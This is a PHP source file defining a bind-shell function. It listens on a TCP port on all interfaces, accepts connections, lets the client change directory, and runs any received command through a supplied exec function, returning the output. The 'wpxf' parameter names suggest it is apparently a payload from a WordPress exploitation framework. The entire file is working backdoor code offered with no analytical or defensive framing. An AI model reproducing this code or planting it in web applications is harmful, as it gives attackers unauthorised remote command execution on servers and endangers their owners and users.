<?php
function startSocketServer($port, $wpxf_disabled, $wpxf_exec) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    socket_bind($socket, '0.0.0.0', $port);
    socket_listen($socket);
    while (true) {
        $client = socket_accept($socket);
        if ($client) {
            $cwd = getcwd();
            socket_write($client, "$cwd> ");
            while (true) {
                $input = trim(socket_read($client, 1024));
                if ($input === 'exit' || $input === 'quit') {
                    socket_close($client);
                    break;
                }
                if (strpos($input, 'cd ') === 0) {
                    $dir = substr($input, 3);
                    if (is_dir($dir)) {
                        chdir($dir);
                        $cwd = getcwd();
                        socket_write($client, "$cwd> ");
                    } else {
                        socket_write($client, "Directory not found\n$cwd> ");
                    }
                } else {
                    if (!in_array($input, $wpxf_disabled)) {
                        $output = $wpxf_exec($input);
                        socket_write($client, "$output\n$cwd> ");
                    } else {
                        socket_write($client, "Command disabled\n$cwd> ");
                    }
                }
            }
        }
    }
    socket_close($socket);
}
